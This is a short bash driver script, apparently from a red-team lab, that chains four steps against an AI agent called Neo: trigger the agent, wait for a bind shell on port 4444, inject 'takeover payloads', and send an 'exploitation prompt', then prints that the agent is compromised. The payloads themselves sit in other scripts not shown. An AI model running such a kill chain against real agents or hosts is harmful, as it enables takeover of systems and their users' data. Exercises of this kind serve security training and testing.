#!/usr/bin/env bash
# Full attack sequence: trigger → wait → connect → exploit.
# Runs all phases sequentially from inside the attacker pod.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: full-attack.sh"
  echo "  Runs the complete attack sequence: trigger agent, wait for bind shell,"
  echo "  inject takeover payloads, and send exploitation prompt."
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  NEO_UI_SVC   neo-ui service address (default: neo-ui.\$AGENT_NS.svc:3458)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Neo | Full Attack Sequence"
echo ""
echo "@PHASE Trigger"

"$SCRIPT_DIR/trigger.sh"
echo ""
echo "@PHASE Wait-Shell"

"$SCRIPT_DIR/wait-shell.sh"
echo ""
echo "@PHASE Connect"

"$SCRIPT_DIR/connect.sh"
echo ""
echo "@PHASE Exploit"

"$SCRIPT_DIR/exploit.sh"
echo ""

banner "Attack Sequence Complete"
echo "@RESULT success Full kill chain executed — agent compromised"
echo ""
echo "  Monitor the Neo UI to observe results."
echo "  Cleanup is handled by the facilitator: make clean (or ./scripts/cleanup.sh)"
